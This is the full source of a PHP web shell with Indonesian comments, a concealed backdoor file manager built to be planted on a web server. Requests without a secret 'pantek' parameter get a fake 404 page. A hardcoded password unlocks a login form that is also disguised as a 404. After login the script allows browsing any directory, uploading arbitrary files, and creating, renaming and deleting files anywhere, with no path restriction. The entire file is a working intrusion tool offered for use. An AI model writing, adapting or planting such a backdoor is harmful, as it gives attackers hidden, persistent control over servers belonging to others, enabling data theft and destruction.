<?php
// Parameter gate - harus akses dengan ?pantek
if (!isset($_GET['pantek']) && !isset($_POST['pantek'])) {
    // Tampilkan halaman kosong / 404 palsu
    header("HTTP/1.0 404 Not Found");
    die("<html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>");
}
session_start();
$pass = "ganteng"; // GANTI PASSWORDNYA DI SINI!

if (!isset($_SESSION['view'])) {
    $login_error = '';
    if (isset($_POST['p'])) {
        if ($_POST['p'] == $pass) {
            $_SESSION['view'] = true;
        } else {
            $login_error = 'Password salah!';
        }
    }
    if (!isset($_SESSION['view'])) {
        die('<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0d1117; color: #c9d1d9; font-family: "Segoe UI", sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-card { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px 35px; width: 360px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); }
        .login-card h3 { text-align: center; margin-bottom: 25px; font-size: 18px; color: #58a6ff; }
        .login-card label { display: block; font-size: 13px; color: #8b949e; margin-bottom: 6px; }
        .login-card input[type="password"] { width: 100%; padding: 10px 14px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #c9d1d9; font-size: 14px; outline: none; transition: border-color 0.2s; }
        .login-card input[type="password"]:focus { border-color: #58a6ff; }
        .login-card input[type="submit"] { width: 100%; padding: 10px; margin-top: 20px; background: #238636; border: 1px solid #2ea043; border-radius: 6px; color: #fff; font-size: 14px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
        .login-card input[type="submit"]:hover { background: #2ea043; }
        .error { background: #da363430; border: 1px solid #f85149; color: #f85149; padding: 8px 12px; border-radius: 6px; font-size: 13px; text-align: center; margin-bottom: 15px; }
    </style>
</head>
<body>
    <form method="post" class="login-card">
        <h3>🔒 Authentication Required</h3>
        '.($login_error ? '<div class="error">'.$login_error.'</div>' : '').'
        <label>Password</label>
        <input type="password" name="p" placeholder="Enter password..." autofocus>
        <input type="hidden" name="pantek" value="1">
        <input type="submit" value="Login">
    </form>
</body>
</html>');
    }
}

$path = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
// Coba realpath dulu, kalau gagal pakai path mentah
$resolved = @realpath($path);
if ($resolved !== false) {
    $path = $resolved;
}
// Normalize backslash ke forward slash
$path = str_replace('\\', '/', $path);
// Hapus trailing slash (kecuali root "/")
$path = rtrim($path, '/');
if ($path === '') $path = '/';

// --- LOGIC BUAT FOLDER ---
if (isset($_POST['new_folder'])) {
    $folder_name = $_POST['new_folder'];
    $target_folder = $path . '/' . $folder_name;
    if (!file_exists($target_folder)) {
        mkdir($target_folder, 0755);
        header("Location: ?pantek&dir=" . urlencode($path)); exit;
    }
}

// --- LOGIC BUAT FILE ---
if (isset($_POST['new_file'])) {
    $file_name = $_POST['new_file'];
    $target_file = $path . '/' . $file_name;
    if (!file_exists($target_file)) {
        file_put_contents($target_file, '');
        header("Location: ?pantek&dir=" . urlencode($path)); exit;
    }
}

// --- LOGIC RENAME ---
if (isset($_GET['oldname']) && isset($_GET['newname'])) {
    $old = $_GET['oldname'];
    $new = dirname($old) . '/' . $_GET['newname'];
    if (file_exists($old)) {
        rename($old, $new);
        header("Location: ?pantek&dir=" . urlencode($path)); exit;
    }
}

// --- LOGIC HAPUS ---
if (isset($_GET['del'])) {
    $target = $_GET['del'];
    if (is_dir($target)) {
        rmdir($target); // Hanya hapus folder kosong, buat keamanan
    } else {
        unlink($target);
    }
    header("Location: ?pantek&dir=" . urlencode($path)); exit;
}

// --- LOGIC UPLOAD ---
if (isset($_FILES['u'])) {
    move_uploaded_file($_FILES['u']['tmp_name'], $path.'/'.$_FILES['u']['name']);
    header("Location: ?pantek&dir=" . urlencode($path)); exit;
}

$folders = explode('/', $path);
?>

<!DOCTYPE html>
<html>
<head>
    <title>Explorer V3 - LiteSpeed Ready</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .breadcrumb { background: #161b22; padding: 12px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #30363d; }
        .breadcrumb a { color: #58a6ff; text-decoration: none; }
        table { width: 100%; border-collapse: collapse; background: #161b22; border: 1px solid #30363d; border-radius: 6px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #30363d; }
        tr:hover { background: #21262d; }
        .dir { color: #d29922; font-weight: bold; text-decoration: none; }
        .file { color: #c9d1d9; }
        .actions { display: flex; gap: 8px; }
        .btn { font-size: 11px; text-decoration: none; padding: 4px 8px; border-radius: 4px; font-weight: bold; cursor: pointer; background: transparent; }
        .btn-del { border: 1px solid #f85149; color: #f85149; }
        .btn-ren { border: 1px solid #58a6ff; color: #58a6ff; }
        .tool-bar { display: flex; gap: 10px; margin-bottom: 20px; background: #161b22; padding: 15px; border-radius: 6px; border: 1px solid #30363d; }
        input[type="text"], input[type="file"] { background: #0d1117; border: 1px solid #30363d; color: white; padding: 5px; border-radius: 4px; }
    </style>
    <script>
        function renameFile(oldPath, oldName) {
            let newName = prompt("Ganti nama menjadi:", oldName);
            if (newName && newName !== oldName) {
                window.location.href = "?pantek&dir=<?php echo urlencode($path); ?>&oldname=" + encodeURIComponent(oldPath) + "&newname=" + encodeURIComponent(newName);
            }
        }
    </script>
</head>
<body>

<div class="breadcrumb">
    <strong>📍 Location: </strong>
    <?php 
    $acc = "";
    foreach ($folders as $f) {
        if ($f === "") { $acc = "/"; echo '<a href="?pantek&dir=/">Root</a>'; } 
        else { $acc .= ($acc == "/" ? "" : "/") . $f; echo '<span> / </span><a href="?pantek&dir='.urlencode($acc).'">'.$f.'</a>'; }
    }
    ?>
</div>

<div class="tool-bar">
    <form method="post" action="?pantek&dir=<?php echo urlencode($path); ?>" enctype="multipart/form-data" style="display:inline;">
        <span>Upload: </span><input type="file" name="u"> <input type="submit" value="Upload" style="cursor:pointer;">
    </form>
    <div style="border-left: 1px solid #30363d; margin: 0 10px;"></div>
    <form method="post" action="?pantek&dir=<?php echo urlencode($path); ?>" style="display:inline;">
        <span>New Folder: </span><input type="text" name="new_folder" placeholder="Nama folder..." required> 
        <input type="submit" value="Buat" style="cursor:pointer;">
    </form>
    <div style="border-left: 1px solid #30363d; margin: 0 10px;"></div>
    <form method="post" action="?pantek&dir=<?php echo urlencode($path); ?>" style="display:inline;">
        <span>New File: </span><input type="text" name="new_file" placeholder="Nama file..." required> 
        <input type="submit" value="Buat" style="cursor:pointer;">
    </form>
</div>

<table>
    <thead><tr><th>Nama</th><th>Aksi</th></tr></thead>
    <tbody>
        <?php
        // Link ke parent directory
        $parent = dirname($path);
        if ($parent !== $path) {
            echo '<tr><td><a class="dir" href="?pantek&dir='.urlencode($parent).'">📁 ..</a></td><td></td></tr>';
        }
        
        $items = @scandir($path);
        if ($items === false) {
            echo '<tr><td colspan="2" style="color:#f85149;text-align:center;padding:20px;">⚠️ Tidak bisa membaca folder: '.htmlspecialchars($path).'<br><small>Kemungkinan open_basedir restriction atau permission denied</small></td></tr>';
            $items = array();
        }
        foreach ($items as $i) {
            if ($i == "." || $i == "..") continue;
            $full = $path . '/' . $i;
            $isDir = is_dir($full);
        ?>
        <tr>
            <td>
                <?php if ($isDir): ?>
                    <a class="dir" href="?pantek&dir=<?php echo urlencode($full); ?>">📁 <?php echo $i; ?></a>
                <?php else: ?>
                    <span class="file">📄 <?php echo $i; ?></span>
                <?php endif; ?>
            </td>
            <td class="actions">
                <button class="btn btn-ren" onclick="renameFile('<?php echo addslashes($full); ?>', '<?php echo addslashes($i); ?>')">RENAME</button>
                <a href="?pantek&dir=<?php echo urlencode($path); ?>&del=<?php echo urlencode($full); ?>" class="btn btn-del" onclick="return confirm('Hapus <?php echo $i; ?>?')">DELETE</a>
            </td>
        </tr>
        <?php } ?>
    </tbody>
</table>

</body>
</html>
